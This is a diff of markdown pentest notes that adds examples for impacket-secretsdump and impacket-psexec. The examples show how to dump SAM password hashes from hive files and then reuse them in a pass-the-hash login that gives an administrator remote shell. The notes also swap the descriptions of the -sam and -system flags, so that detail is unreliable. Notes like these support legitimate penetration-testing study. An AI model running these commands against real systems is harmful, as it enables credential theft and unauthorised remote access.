@@ -33,12 +33,51 @@ $ impacket-smbserver -smb2support -username jarrett -password mynamejeff public 
 
 **impacket-secretsdump**
 
+**Eg.** The example below dumps the hashes from the `sam.hive`and `system.hive`files present on the current folder (specified by the `LOCAL` target option).
+
 ```bash
-$ 
+# Simple usage
+$ impacket-secretsdump -sam SAM -system SYSTEM target  
+
+# eg.
+$ ls 
+sam.hive system.hive
+
+$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+Impacket vxxx - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: ...
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+...:::
+Guest:xxx:xxx:xxx::
+Administrator:xx12xx:xx34xx::
+...
 ```
+
+* `-sam`:  **SYSTEM** hive to parse
+* `-system`:  **SAM** hive to parse
+* `target`:  \[`[domain/]username[:password]@`] or `LOCAL` (if you want to parse local files)
 
 **impacket-psexec**
 
+**Eg.** The example below uses the hashes found from the `impacket-secretsdump` command above, to authenticate as the _**administrator**_ user. This provides us with a remote shell as the specified user.
+
 ```bash
-$ 
+# Simple usage
+$ impacket-psexec -hashes LMHASH:NTHASH target
+
+# eg.
+$ impacket-psexec -hashes xx12xx:xx34xx administrator@10.10.x.x
+...
 ```
+
+_**What is PsExec?**_
+
+{% embed url="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec" %}
+
+* `-hashes`: NTLM hashes, format is `LMHASH:NTHASH`
+* `target`: \[`[domain/]username[:password]@`]
+
+
+
+{% embed url="https://www.kali.org/tools/impacket/" %}
